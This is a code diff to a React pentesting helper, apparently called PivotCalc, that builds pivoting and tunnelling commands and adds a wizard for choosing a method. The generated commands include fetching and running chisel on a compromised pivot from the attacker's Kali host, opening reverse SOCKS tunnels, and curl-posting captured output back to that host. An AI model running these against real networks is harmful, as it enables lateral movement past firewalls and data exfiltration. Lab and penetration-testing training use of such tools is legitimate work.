@@ -17,7 +17,7 @@ const methods = [
 
 const protocols = [
   { id: "smb", label: "SMB", port: "445", tools: "smbclient -p {lport} //{host}/ -U {user} --password={pass}\ncrackmapexec smb {host} -p {lport} -u {user} -p {pass}" },
-  { id: "ssh", label: "SSH", port: "22", tools: "ssh {user}@{host} -p {lport}" },
+  { id: "ssh", label: "SSH", port: "22", tools: "ssh {user}@{host} -p {lport}\n# Through SOCKS proxy (ncat required):\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' {user}@{host}\n# Install ncat if missing: sudo apt install ncat" },
   { id: "rdp", label: "RDP", port: "3389", tools: "xfreerdp /u:{user} /p:{pass} /v:{host}:{lport}" },
   { id: "http", label: "HTTP", port: "80", tools: "curl http://{host}:{lport}\nferoxbuster -u http://{host}:{lport}" },
   { id: "postgres", label: "PostgreSQL", port: "5432", tools: "psql -h {host} -p {lport} -U postgres" },
@@ -25,6 +25,147 @@ const protocols = [
   { id: "winrm", label: "WinRM", port: "5985", tools: "evil-winrm -i {host} -P {lport} -u {user} -p {pass}" },
   { id: "custom", label: "Custom", port: "", tools: "" },
 ];
+
+
+// ── WIZARD DECISION TREE ─────────────────────────────
+const tree = {
+  start: { q:"Can Kali connect TO the pivot host directly?", hint:"Is the pivot reachable from your attack box, or does a firewall block inbound?", opts:[
+    { label:"Yes — Kali can reach pivot", next:"has_ssh_out" },
+    { label:"No — inbound is firewalled", next:"pivot_can_reach_kali" },
+  ]},
+  has_ssh_out: { q:"Do you have SSH credentials for the pivot?", opts:[
+    { label:"Yes — SSH creds available", next:"ssh_available" },
+    { label:"No — shell only, no SSH creds", next:"no_ssh_creds" },
+  ]},
+  ssh_available: { q:"How many internal targets do you need?", opts:[
+    { label:"One specific port / service", next:"one_target" },
+    { label:"Multiple hosts — need to scan", next:"multi_target" },
+  ]},
+  one_target: { q:"Want transparent routing (no proxychains)?", opts:[
+    { label:"Yes — VPN-like direct access", next:"sshuttle_check" },
+    { label:"No — single port forward is fine", result:"ssh_local" },
+  ]},
+  sshuttle_check: { q:"Root on Kali + Python3 on pivot?", opts:[
+    { label:"Yes", result:"sshuttle" },
+    { label:"No / unsure", result:"ssh_local" },
+  ]},
+  multi_target: { q:"Can you upload tools to the pivot?", opts:[
+    { label:"Yes — can transfer binaries", next:"has_tools" },
+    { label:"No — restricted environment", result:"ssh_dynamic" },
+  ]},
+  has_tools: { q:"Which tool is available?", opts:[
+    { label:"Ligolo agent (fastest, no proxychains)", result:"ligolo" },
+    { label:"Chisel", result:"chisel_server" },
+    { label:"Neither — SSH creds only", result:"ssh_dynamic" },
+  ]},
+  no_ssh_creds: { q:"Is socat on the pivot?", opts:[
+    { label:"Yes", result:"socat" },
+    { label:"No", next:"no_tools_check" },
+  ]},
+  no_tools_check: { q:"What OS is the pivot?", opts:[
+    { label:"Linux — bash + nc available", result:"nc_fifo" },
+    { label:"Windows", next:"win_admin" },
+  ]},
+  pivot_can_reach_kali: { q:"Can pivot SSH OUT to Kali (port 22)?", hint:"Outbound SSH is usually allowed even when inbound is blocked", opts:[
+    { label:"Yes — pivot can reach Kali", next:"remote_type" },
+    { label:"No — fully locked down", next:"pivot_os" },
+  ]},
+  remote_type: { q:"How many targets?", opts:[
+    { label:"One specific port", result:"ssh_remote" },
+    { label:"Multiple — need full access", result:"ssh_remote_dynamic" },
+  ]},
+  pivot_os: { q:"What OS is the pivot?", opts:[
+    { label:"Linux — limited options", result:"nc_fifo" },
+    { label:"Windows", next:"win_admin" },
+  ]},
+  win_admin: { q:"What's available on the Windows pivot?", opts:[
+    { label:"OpenSSH (Windows 10 1803+)", result:"ssh_exe" },
+    { label:"Can upload plink.exe", result:"plink" },
+    { label:"Admin rights — use native Netsh", result:"netsh" },
+  ]},
+};
+
+const wizResults = {
+  ssh_local: { why:"Direct access + single target = SSH Local (-L). Simplest and most reliable.", when:"One port, SSH creds, Kali can reach pivot directly." },
+  ssh_dynamic: { why:"Multiple targets = SSH Dynamic (-D) creates a SOCKS proxy. Scan anything via proxychains.", when:"Need to scan internal network, SSH creds available." },
+  ssh_remote: { why:"Inbound blocked but outbound works = SSH Remote (-R). Pivot connects back to Kali.", when:"Firewall blocks inbound, pivot can SSH out, single target." },
+  ssh_remote_dynamic: { why:"Inbound blocked + multiple targets = reverse SOCKS proxy on Kali via outbound SSH.", when:"Firewall blocks inbound, pivot can SSH out, need to scan." },
+  sshuttle: { why:"Transparent VPN-like routing. No proxychains — tools work natively. Best experience.", when:"Root on Kali, Python3 on pivot, multiple targets." },
+  socat: { why:"No SSH creds but socat available = one-command port forward.", when:"Shell access, socat installed, no SSH creds." },
+  nc_fifo: { why:"Bare minimum — bash + nc only. Single connection.", when:"Fully restricted pivot, no tools available." },
+  plink: { why:"Windows without OpenSSH = Plink for SSH remote port forwarding.", when:"Windows pivot, can upload plink.exe, no OpenSSH." },
+  netsh: { why:"Native Windows port forwarding. No tools needed — but needs admin and leaves artifacts.", when:"Windows pivot with admin rights." },
+  ssh_exe: { why:"Modern Windows has OpenSSH built in. Same commands as Linux.", when:"Windows 10 1803+ with OpenSSH available." },
+  chisel_server: { why:"Can upload tools + need SOCKS = Chisel reverse tunnel.", when:"Can transfer binaries, need full internal access." },
+  ligolo: { why:"Fastest option — native routing, no proxychains overhead. Upload agent once.", when:"Can transfer agent binary, need maximum flexibility." },
+};
+
+function Wizard({ onSelect }) {
+  const [history, setHistory] = useState([{ node:"start" }]);
+  const [done, setDone] = useState(null);
+  const current = history[history.length-1];
+  const node = tree[current.node];
+
+  const choose = (opt) => {
+    if (opt.result) {
+      setDone(opt.result);
+    } else {
+      setHistory(h => [...h, { node: opt.next }]);
+    }
+  };
+
+  const back = () => {
+    if (done) { setDone(null); return; }
+    if (history.length > 1) setHistory(h => h.slice(0,-1));
+  };
+
+  const reset = () => { setHistory([{node:"start"}]); setDone(null); };
+
+  if (done) {
+    const res = wizResults[done];
+    const methodLabel = methods.find(m=>m.id===done)?.label || done;
+    return (
+      <div className="wiz-result">
+        <div className="wiz-rec-label">Recommended Method</div>
+        <div className="wiz-rec-method">{methodLabel}</div>
+        <div className="wiz-rec-why">{res.why}</div>
+        <div className="wiz-rec-when">Best when: {res.when}</div>
+        <div className="wiz-btns">
+          <button className="wiz-use" onClick={()=>onSelect(done)}>Use this method →</button>
+          <button className="wiz-back" onClick={back}>← Back</button>
+          <button className="wiz-reset" onClick={reset}>Start over</button>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="wiz-body">
+      {history.length > 1 && (
+        <div className="wiz-breadcrumb">
+          {history.map((h,i) => (
+            <span key={i} className="wiz-bc-item">
+              {i>0 && <span className="wiz-bc-sep">›</span>}
+              {tree[h.node]?.q?.slice(0,30)}...
+            </span>
+          ))}
+        </div>
+      )}
+      <div className="wiz-q">{node?.q}</div>
+      {node?.hint && <div className="wiz-hint">💡 {node.hint}</div>}
+      <div className="wiz-opts">
+        {node?.opts?.map((opt,i) => (
+          <button key={i} className="wiz-opt" onClick={()=>choose(opt)}>
+            {opt.label}
+          </button>
+        ))}
+      </div>
+      {history.length > 1 && (
+        <button className="wiz-back" onClick={back}>← Back</button>
+      )}
+    </div>
+  );
+}
 
 const usesSocks = (m) => ["ssh_dynamic","ssh_remote_dynamic","ssh_exe","chisel_server"].includes(m);
 const isRemote = (m) => ["ssh_remote","ssh_remote_dynamic","plink","ssh_exe"].includes(m);
@@ -150,10 +291,13 @@ function gen(method, f) {
       { label:"▶ From Kali — use proxychains", cmd:`proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains psql -h ${p.target} -U postgres`, verify:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
     ];
     case "chisel_server": return [
-      { label:"▶ On Kali — start chisel server", cmd:`./chisel server -p 8080 --reverse --socks5`, verify:`ss -ntlp | grep 8080` },
-      { label:"▶ Transfer chisel to pivot", cmd:`python3 -m http.server 80\n# On pivot:\nwget http://${p.kali}/chisel -O /tmp/chisel && chmod +x /tmp/chisel` },
-      { label:"▶ On pivot — connect to Kali", cmd:`/tmp/chisel client ${p.kali}:8080 R:socks`, note:"Creates SOCKS proxy on Kali port 1080", verify:`# On Kali:\nss -ntlp | grep 1080` },
-      { label:"▶ Single port (no SOCKS)", cmd:`/tmp/chisel client ${p.kali}:8080 R:${p.lp}:${p.target}:${p.tp}` },
+      { label:"▶ On Kali — serve chisel binary", cmd:`sudo cp $(which chisel) /var/www/html/\nsudo systemctl start apache2\n# If target gets GLIBC error — use Go 1.19 build instead:\nwget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz\ngunzip chisel_1.8.1_linux_amd64.gz && mv chisel_1.8.1_linux_amd64 chisel\nsudo cp chisel /var/www/html/`, note:"GLIBC mismatch = Kali chisel (Go 1.20+) won't run on Ubuntu 20.04. Use Go 1.19 build from GitHub." },
+      { label:"▶ On Kali — start chisel server", cmd:`chisel server --port 8080 --reverse`, verify:`ss -ntlp | grep 8080` },
+      { label:"▶ On pivot — download chisel", cmd:`wget http://${p.kali}/chisel -O /tmp/chisel && chmod +x /tmp/chisel` },
+      { label:"▶ On pivot — start reverse SOCKS", cmd:`/tmp/chisel client ${p.kali}:8080 R:socks > /dev/null 2>&1 &`, note:"SOCKS proxy created on Kali port 1080. No output = working.", verify:`# On Kali:\nss -ntlp | grep 1080` },
+      { label:"▶ Debug — capture error output from pivot", cmd:`/tmp/chisel client ${p.kali}:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://${p.kali}:8080/\n# tcpdump on Kali shows error in POST body:\nsudo tcpdump -nvvvXi tun0 tcp port 8080`, note:"Use this if chisel fails silently — sends error output back via HTTP" },
+      { label:"▶ SSH through SOCKS (needs ncat)", cmd:`# Install ncat if needed:\nsudo apt install ncat\n\n# SSH via SOCKS proxy:\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' ${p.pivotUser}@${p.target}`, note:"Standard nc doesn't support SOCKS. Use ncat from nmap project." },
+      { label:"▶ Single port forward (no SOCKS)", cmd:`/tmp/chisel client ${p.kali}:8080 R:${p.lp}:${p.target}:${p.tp}\n# Kali localhost:${p.lp} → ${p.target}:${p.tp}` },
       ...(h2block?[h2block]:[]),
     ];
     case "ligolo": return [
@@ -173,6 +317,7 @@ export default function PivotCalc() {
   const [method, setMethod] = useState("ssh_local");
   const [proto, setProto] = useState("smb");
   const [showH2, setShowH2] = useState(false);
+  const [showWiz, setShowWiz] = useState(false);
   const [f, setF] = useState({
     kaliIp:"", pivotExtIp:"", pivotIntIp:"", pivotUser:"database_admin", pivotPass:"",
     targetIp:"", targetPort:"445", listenPort:"4455", socksPort:"9999",
@@ -186,11 +331,14 @@ export default function PivotCalc() {
   const remote = isRemote(method);
   const selProto = protocols.find(p=>p.id===proto);
   const pcHost = remote ? "127.0.0.1" : (f.pivotExtIp||"<pivot_ext>");
-  const toolHost = socks ? (remote?"127.0.0.1":f.pivotExtIp||"<pivot>") : (f.pivotExtIp||"<pivot>");
+  // SOCKS methods: connect directly to target IP:targetPort via proxychains
+  // Port-forward methods: connect to pivot external IP:listenPort
+  const toolHost = socks ? (f.targetIp||"<target>") : (f.pivotExtIp||"<pivot>");
+  const toolPort = socks ? (f.targetPort||"<port>") : (f.listenPort||"4455");
 
   const toolsRaw = selProto?.tools
     ?.replace(/{host}/g, toolHost)
-    ?.replace(/{lport}/g, f.listenPort||"4455")
+    ?.replace(/{lport}/g, toolPort)
     ?.replace(/{user}/g, f.pivotUser||"user")
     ?.replace(/{pass}/g, f.pivotPass||"<pass>");
   const tools = socks && toolsRaw ? toolsRaw.split('\n').map(l=>`proxychains ${l}`).join('\n') : toolsRaw;
@@ -264,6 +412,28 @@ export default function PivotCalc() {
         .vtext{font-size:.62rem;color:#6eca8a;flex:1;white-space:pre-wrap;word-break:break-all}
         .empty{text-align:center;padding:2rem;color:#2d4a6b;font-size:.72rem}
         .chwrap{display:flex;justify-content:space-between;align-items:center;width:100%}
+        .wiz-wrap{border:1px solid #1e3a5f;border-radius:8px;overflow:hidden}
+        .wiz-toggle{width:100%;background:#0a1520;border:none;padding:.6rem 1rem;color:#4a90d9;font-family:'JetBrains Mono',monospace;font-size:.68rem;cursor:pointer;text-align:left;display:flex;justify-content:space-between;align-items:center;transition:all .12s}
+        .wiz-toggle:hover{background:#0d1a2e}
+        .wiz-toggle.open{border-bottom:1px solid #1e3a5f}
+        .wiz-inner{background:#060d18;padding:1.1rem}
+        .wiz-breadcrumb{display:flex;flex-wrap:wrap;gap:.2rem;margin-bottom:.75rem;font-size:.55rem;color:#2d4a6b}
+        .wiz-bc-sep{margin:0 .2rem}
+        .wiz-q{font-size:.82rem;color:#c8d6e5;font-weight:600;margin-bottom:.5rem;line-height:1.4}
+        .wiz-hint{font-size:.62rem;color:#4a6580;margin-bottom:.75rem;font-style:italic}
+        .wiz-opts{display:flex;flex-direction:column;gap:.4rem;margin-bottom:.75rem}
+        .wiz-opt{background:#0a1018;border:1px solid #1e2d40;border-radius:5px;padding:.55rem .8rem;color:#7a9bbf;font-family:'JetBrains Mono',monospace;font-size:.7rem;cursor:pointer;text-align:left;transition:all .15s}
+        .wiz-opt:hover{border-color:#4a90d9;color:#c8d6e5;background:#0d1828}
+        .wiz-back,.wiz-reset{background:none;border:1px solid #1e2d40;border-radius:4px;padding:.3rem .6rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.62rem;cursor:pointer;margin-right:.4rem;transition:all .12s}
+        .wiz-back:hover{color:#c8d6e5;border-color:#4a5568}
+        .wiz-result{display:flex;flex-direction:column;gap:.6rem}
+        .wiz-rec-label{font-size:.58rem;text-transform:uppercase;letter-spacing:.1em;color:#4a5568}
+        .wiz-rec-method{font-size:1.1rem;font-family:'Syne',sans-serif;font-weight:800;color:#4ade80}
+        .wiz-rec-why{font-size:.72rem;color:#a0c4e8;line-height:1.5}
+        .wiz-rec-when{font-size:.65rem;color:#4a6580;font-style:italic}
+        .wiz-btns{display:flex;align-items:center;gap:.4rem;flex-wrap:wrap;margin-top:.25rem}
+        .wiz-use{background:#0d1f10;border:1px solid #4ade80;border-radius:5px;padding:.4rem .9rem;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:.7rem;cursor:pointer;transition:all .12s}
+        .wiz-use:hover{background:#152a18}
       `}</style>
 
       <div className="hdr">
@@ -292,6 +462,19 @@ export default function PivotCalc() {
               )}
             </div>
           ))}
+        </div>
+
+        {/* WIZARD */}
+        <div className="wiz-wrap">
+          <button className={`wiz-toggle${showWiz?" open":""}`} onClick={()=>setShowWiz(v=>!v)}>
+            <span>🧭 Not sure which method? — Answer 2-3 questions</span>
+            <span>{showWiz?"▲":"▼"}</span>
+          </button>
+          {showWiz && (
+            <div className="wiz-inner">
+              <Wizard onSelect={(m)=>{ setMethod(m); setShowWiz(false); }} />
+            </div>
+          )}
         </div>
 
         {/* METHOD */}
